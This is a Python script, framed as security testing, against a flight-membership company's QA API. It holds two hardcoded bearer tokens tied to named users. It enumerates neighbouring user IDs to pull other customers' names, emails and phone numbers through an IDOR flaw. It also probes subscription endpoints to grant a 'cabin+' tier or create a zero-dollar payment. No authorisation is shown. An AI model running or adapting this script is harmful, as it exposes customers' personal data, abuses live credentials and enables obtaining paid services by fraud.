#!/usr/bin/env python3
"""
Vaunt API Security Testing Script
Tests: IDOR, Priority Score Analysis, Priority Pass Access
"""

import requests
import json
from datetime import datetime

# API Configuration
BASE_URL = "https://qa-vauntapi.flyvaunt.com"

# Tokens from TOKENS.txt
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

# Known User IDs
ASHLEY_ID = 171208
SAMEER_ID = 20254

def make_request(method, endpoint, token, data=None):
    """Make authenticated API request"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    url = f"{BASE_URL}{endpoint}"
    
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            response = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PATCH":
            response = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "PUT":
            response = requests.put(url, headers=headers, json=data, timeout=10)
        else:
            return None
            
        return {
            "status_code": response.status_code,
            "data": response.json() if response.text else None,
            "headers": dict(response.headers)
        }
    except Exception as e:
        return {
            "error": str(e),
            "status_code": None
        }

def test_idor_vulnerability():
    """Test 1: Can we access other users' data via IDOR?"""
    print("\n" + "="*80)
    print("TEST 1: IDOR VULNERABILITY - Accessing Other Users' Data")
    print("="*80)
    
    # Test user IDs around known IDs
    test_ids = [
        ASHLEY_ID - 1,  # 171207
        ASHLEY_ID + 1,  # 171209
        ASHLEY_ID + 2,  # 171210
        SAMEER_ID - 1,  # 20253
        SAMEER_ID + 1,  # 20255
        1,              # First user
        100,            # Early user
        200000,         # High ID
    ]
    
    print(f"\nUsing Sameer's token to access other user IDs...")
    
    for user_id in test_ids:
        print(f"\n--- Testing User ID: {user_id} ---")
        
        # Try direct user endpoint with ID
        result = make_request("GET", f"/v1/user/{user_id}", SAMEER_TOKEN)
        
        if result.get("status_code") == 200:
            data = result.get("data", {})
            print(f"✅ SUCCESS! Got user data:")
            print(f"   Name: {data.get('firstName')} {data.get('lastName')}")
            print(f"   Email: {data.get('email')}")
            print(f"   Phone: {data.get('phoneNumber')}")
            print(f"   Subscription Status: {data.get('subscriptionStatus')}")
            print(f"   Priority Score: {data.get('priorityScore')}")
        elif result.get("status_code") == 404:
            print(f"❌ 404 - User not found or endpoint doesn't exist")
        elif result.get("status_code") == 401:
            print(f"❌ 401 - Unauthorized")
        elif result.get("status_code") == 403:
            print(f"❌ 403 - Forbidden (IDOR protection working!)")
        else:
            print(f"❌ Status: {result.get('status_code')} - {result.get('error')}")

def analyze_priority_score_changes():
    """Test 2: Investigate priority score changes"""
    print("\n" + "="*80)
    print("TEST 2: PRIORITY SCORE ANALYSIS")
    print("="*80)
    
    print("\n--- Getting current Sameer data ---")
    result = make_request("GET", "/v1/user", SAMEER_TOKEN)
    
    if result.get("status_code") == 200:
        data = result.get("data", {})
        current_score = data.get("priorityScore")
        
        print(f"\n✅ Current Sameer Priority Score: {current_score}")
        
        # Convert to datetime
        if current_score:
            dt = datetime.fromtimestamp(current_score)
            print(f"   As Date: {dt.strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"   Years from now: {(dt.year - 2025):.1f} years")
        
        print("\n📊 Historical Priority Score Data from Documents:")
        print("   - Original (from database): 1931577847")
        print("     → Date: 2031-04-09 (6.4 years in future)")
        print("   - Later updated to: 1836969847")
        print("     → Date: 2028-03-15 (3.3 years in future)")
        print(f"   - Current (from API): {current_score}")
        
        if current_score:
            print(f"\n🔍 Priority Score Change Analysis:")
            old_score = 1931577847
            mid_score = 1836969847
            change1 = mid_score - old_score
            
            print(f"   Change 1: {old_score} → {mid_score}")
            print(f"   Difference: {change1:,} seconds")
            print(f"   Time shift: {abs(change1) / (365.25 * 24 * 3600):.2f} years")
            print(f"   Direction: {'Decreased ⬇️' if change1 < 0 else 'Increased ⬆️'}")
            
            if current_score != mid_score:
                change2 = current_score - mid_score
                print(f"\n   Change 2: {mid_score} → {current_score}")
                print(f"   Difference: {change2:,} seconds")
                print(f"   Time shift: {abs(change2) / (365.25 * 24 * 3600):.2f} years")
        
        print("\n💡 Theory: Priority Score = Account Age + Subscription Boost")
        print("   - Lower score (older date) = WORSE waitlist position")
        print("   - Higher score (future date) = BETTER waitlist position")
        print("   - Score changes may be due to subscription renewals or cancellations")
    else:
        print(f"❌ Failed to get user data: {result}")

def test_priority_pass_access():
    """Test 3: Can we get cabin+ priority pass?"""
    print("\n" + "="*80)
    print("TEST 3: PRIORITY PASS / CABIN+ ACCESS TESTING")
    print("="*80)
    
    # Test various endpoints related to priority/upgrades
    test_endpoints = [
        ("GET", "/v1/app/upgrade-offer/list", None),
        ("GET", "/v1/subscription/pk", None),
        ("POST", "/v1/subscription/restore", None),
        ("GET", "/v1/flight/available", None),
        ("POST", "/v1/user/license", {"membershipTier": "cabin+"}),
        ("POST", "/v1/subscription/paymentIntent?membershipTier=cabin%2B", {"amount": 0, "currency": "USD"}),
    ]
    
    print(f"\n--- Testing with Sameer's token (has cabin+ access) ---")
    
    for method, endpoint, data in test_endpoints:
        print(f"\n{method} {endpoint}")
        result = make_request(method, endpoint, SAMEER_TOKEN, data)
        
        status = result.get("status_code")
        print(f"Status: {status}")
        
        if status == 200:
            response_data = result.get("data", {})
            print(f"✅ SUCCESS! Response:")
            print(json.dumps(response_data, indent=2)[:500])  # First 500 chars
        elif status == 404:
            print(f"❌ Endpoint not found")
        elif status == 401:
            print(f"❌ Unauthorized")
        else:
            print(f"❌ Error: {result.get('error', 'Unknown')}")
    
    print(f"\n\n--- Testing with Ashley's token (basic account) ---")
    print("(Ashley's token may be expired/invalid - 401 expected)")
    
    result = make_request("GET", "/v1/app/upgrade-offer/list", ASHLEY_TOKEN)
    if result.get("status_code") == 200:
        print("✅ Ashley's token still works!")
        data = result.get("data", {})
        print(json.dumps(data, indent=2)[:500])
    elif result.get("status_code") == 401:
        print("❌ Ashley's token rejected (401) - as documented")
    else:
        print(f"Status: {result.get('status_code')}")

def main():
    print("\n")
    print("╔" + "="*78 + "╗")
    print("║" + " "*20 + "VAUNT API SECURITY TESTING" + " "*32 + "║")
    print("╚" + "="*78 + "╝")
    
    test_idor_vulnerability()
    analyze_priority_score_changes()
    test_priority_pass_access()
    
    print("\n" + "="*80)
    print("TESTING COMPLETE")
    print("="*80 + "\n")

if __name__ == "__main__":
    main()
